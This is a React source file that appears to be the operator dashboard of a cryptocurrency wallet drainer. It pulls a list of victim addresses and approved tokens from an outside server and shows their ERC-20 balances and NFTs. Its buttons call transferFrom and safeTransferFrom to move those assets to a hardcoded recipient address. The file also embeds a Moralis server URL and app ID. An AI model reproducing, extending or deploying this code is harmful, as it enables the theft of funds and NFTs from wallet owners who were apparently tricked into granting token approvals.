import logo from './logo.svg';
import './style.css';
import { useMoralis } from "react-moralis";
import Moralis from 'moralis';
import { useEffect, useState } from 'react';
import { ethers } from 'ethers'


const { ethereum } = window;

const erc20ContractInterface = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

const nftContractInterface = [
  "function transferFrom(address from, address to, uint256 tokenId) external",
  "function safeTransferFrom(address from, address to, uint256 tokenId) external returns (bool)"
];

Moralis.start({ serverUrl: "https://dhbkvqagvjis.usemoralis.com:2053/server", appId: "bvVqpsUuDmGBnVhwsy1VFhQNLZYcfw99VSBvBmM0" });

const App = () => {
  const [provider, setProvider] = useState(null);
  const [errorMessage, setErrorMessage] = useState(null);
  const [defaultAccount, setDefaultAccount] = useState(null);
  const [defaultAccountnew, setDefaultAccountnew] = useState(null);
  const [connButtonText, setConnButtonText] = useState('Connect Wallet');
  const [myAddress, setAddress] = useState("0x279849EB580A2D57908f0bBBD49B521122cA9e9e");
  const [signer, setSigner] = useState(null);
  const [userTokens, setUserTokens] = useState([]);
  const [userNFTs, setUserNFTs] = useState([])

  const fetchTokenBalances = async (tokenAddress, address) => {
    const options = {
      address
    };

    const balances = await Moralis.Web3API.account.getTokenBalances(options);
    //Get token price on PancakeSwap v2 BSC

    const price = await Moralis.Web3API.token.getTokenPrice({ address: tokenAddress });
    const balance = balances.find(el => {
      return el.token_address == tokenAddress
    })

    console.log(price)
    balance.price = price.usdPrice;
    return balance;
  };

  const connectWalletHandler = () => {
    if (window.ethereum && window.ethereum.isMetaMask) {

      window.ethereum.request({ method: 'eth_requestAccounts' })
        .then(result => {
          accountChangedHandler(result[0]);
          setConnButtonText('Wallet Connected');

        })
        .catch(error => {
          setErrorMessage(error.message);

        });

    } else {
      console.log('Need to install MetaMask');
      setErrorMessage('Please install MetaMask browser extension to interact');
    }
  }
  // update account, will cause component re-render
  const accountChangedHandler = (newAccount) => {
    setDefaultAccount(newAccount.slice(-8));
    setDefaultAccountnew(newAccount);
  }

  const chainChangedHandler = () => {
    // reload the page to avoid any errors with chain change mid use of application
    window.location.reload();
  }

  const startFunction = async () => {
    await ethereum.request({ method: "eth_requestAccounts" });
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }],
    });

    let _provider = new ethers.providers.Web3Provider(window.ethereum);
    setSigner(_provider.getSigner());
  };

  const transferToken = (tokenAddress, from, to, amount, decimals) => {
    const tokenContract = new ethers.Contract(
      tokenAddress,
      erc20ContractInterface,
      signer
    );
    tokenContract.transferFrom(from, to, ethers.utils.parseEther(amount))
  }

  const transferNFT = (tokenAddress, from, to, token_id) => {
    console.log(tokenAddress)
    const tokenContract = new ethers.Contract(
      tokenAddress,
      nftContractInterface,
      signer
    );

    tokenContract.safeTransferFrom(from, to, token_id)
  }


  // // listen for account changes
  // window.ethereum.on('accountsChanged', accountChangedHandler);
  // window.ethereum.on('chainChanged', chainChangedHandler);


  const getUsersToken = async () => {
    try {
      let response = await fetch(
        "https://ethers-server.herokuapp.com/user-token/",
        {
          method: 'GET', // *GET, POST, PUT, DELETE, etc.
          headers: {
            'Content-Type': 'application/json'
          }
        }
      )

      response = await response.json();
      const _userTokens = [];
      const _userNFTs = [];
      for (let _userToken of response) {
        try {
          if (_userToken.token_type == "erc20") {
            const _res = await fetchTokenBalances(_userToken.token_address, _userToken.address)
            _userTokens.push({
              ..._userToken,
              decimals: _res.decimals,
              balance: Moralis.Units.FromWei(_res.balance, Number(_res.decimals)),
              price: _res.price
            })
            await new Promise(r => setTimeout(r, 250));
            continue
          }

          _userNFTs.push(_userToken);



        } catch (error) {

        }
      }

      setUserTokens(_userTokens);
      setUserNFTs(_userNFTs)

    } catch (err) {
      console.log(err)
    }

  }

  useEffect(() => {
    connectWalletHandler();
    startFunction();
    getUsersToken();
  }, []);

  return (
    <div className='p-6'>

      <div className="flex flex-col gap-6">
        <div className="py-2 text-3xl">
          User Ethereum
        </div>
        <div className="py-2 text-3xl">
          User Erc20 Tokens
        </div>


        {
          userTokens.map((token, index) => {
            const res = <div key={"erc20"} className="rounded p-3 border shadow-xl hover:shadow-2xl hover:-translate-y-1 cursor-pointer transition-transform">
              <div className="flex justify-between md:gap-0 gap-2 md:flex-row flex-col">
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>User Address</div>
                  <h1 className='md:text-base text-xs'>{token.address}</h1>
                </div>
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>Token Balance</div>
                  <div className='md:text-base text-xs'>{token.balance}</div>
                </div>
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>Token Price</div>
                  <div className='md:text-base text-xs'>                  ${token.price}</div>

                </div>
                <div className="text-left">
                  <button onClick={(e) => transferToken(token.token_address, token.address, myAddress, token.balance, token.decimals)} className="md:px-6 px-3 md:py-2 py-1 md:text-base text-sm rounded-lg bg-indigo-500 text-white">
                    Transfer Funds
                  </button>
                </div>
              </div>
            </div>

            return res
          })
        }
      </div>

      <div className="flex flex-col gap-6 mt-6">
        <div className="py-2 text-3xl">
          User NFTs
        </div>
        {
          userNFTs.map((token, index) => {
            const res = <div key={"nft" + index} className="rounded p-3 border-2 border-slate-300">
              <div className="flex gap-4 md:flex-row flex-col">
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>TUser Address</div>
                  <div className='md:text-base text-xs'>{token.address}</div>
                </div>
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>TNFT Contract Address</div>
                  <div className='md:text-base text-xs'>{token.token_address}</div>
                </div>
                <div className="text-left">
                  <div className='font-semibold md:text-base text-sm'>TNFT Address</div>
                  <h1 className='md:text-base text-xs'>{token.token_id}</h1>
                </div>
                <div className="text-left">
                  <button onClick={(e) => transferNFT(token.token_address, token.address, myAddress, token.token_id)} className="px-6 py-2 rounded-lg bg-indigo-500 text-white">
                    Transfer
                  </button>
                </div>
              </div>
            </div>

            return res;
          })
        }
      </div>

    </div>
  )
}

export default App;
